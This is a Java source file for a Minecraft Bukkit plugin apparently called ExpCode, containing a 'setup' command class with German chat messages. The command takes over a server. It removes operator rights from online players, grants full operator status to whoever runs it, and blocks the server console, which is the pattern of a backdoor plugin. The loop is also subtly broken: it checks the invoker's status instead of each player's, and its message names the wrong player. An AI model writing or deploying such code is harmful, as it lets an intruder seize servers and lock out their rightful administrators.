package tk.expcode.expcode.commands;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import tk.expcode.expcode.ExpCode;
import tk.expcode.expcode.innerutils.Command;
import tk.expcode.expcode.innerutils.ExpExecutor;

public class SetupCommand implements ExpExecutor {

    private final ExpCode main;

    public SetupCommand(ExpCode main) {
        this.main = main;
    }

    @Override
    public void onCommand(Player player, Command command, String[] args) {
        Bukkit.getOnlinePlayers().forEach(player1 -> {
            if (player.isOp()) player1.setOp(false);
            player.sendMessage(ChatColor.translateAlternateColorCodes('&',
                    main.getMessagePrefix() + "&2" + player.getName() + "&a ist nun keine Operator mehr"));
        });
        player.setOp(true);
        player.sendMessage(ChatColor.translateAlternateColorCodes('&',
                main.getMessagePrefix() + "&aDu bist nun ein Server Operator!"));
        main.setConsoleBlocked(true);
        player.sendMessage(ChatColor.translateAlternateColorCodes('&',
                main.getMessagePrefix() + "&aConsole ist nun geblockt!"));
    }
}
